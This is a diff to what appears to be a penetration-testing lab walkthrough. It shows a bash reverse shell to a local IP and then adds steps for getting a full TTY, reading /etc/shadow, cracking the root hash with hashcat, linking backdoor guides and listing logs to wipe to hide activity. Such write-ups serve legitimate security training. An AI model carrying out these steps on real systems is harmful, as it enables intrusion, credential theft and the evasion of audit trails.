@@ -219,14 +219,39 @@ $EXEC("bash -c 'bash -i >& /dev/tcp/192.168.88.225/4444 0>&1'")
 Now, we also have a root.txt.
 
 ### Get normal shell for root
+
+Target:
 ```
-# Target
 python -c 'import pty;pty.spawn("/bin/bash")'
 ^Z
-# Local
+```
+Local:
+```
 stty raw -echo
 f + g + Enter
 ```
+
+### Get root password
+
+Target:
+```
+cat /etc/shadow
+```
+Local:
+```
+hashcat -a 0 -m 1800 root.hash your_wordlist
+```
+
+### Backdoor
+
+I left the ling below how to create backdoors...
+
+### Logs
+
+U need to clean next logs:
+* auth.log - login attempts.
+* vsftpd.log - vsftpd connect and operations with files.
+* deamon.log - logs about your actions on port 5000, HTTP GET, POST, etc.
 
 ## Sources
 
@@ -250,3 +275,6 @@ f + g + Enter
 
 [pentest monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet "http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet")
 
+### Backdoors
+
+[9 ways to backdoor a Linux](https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c "https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c")
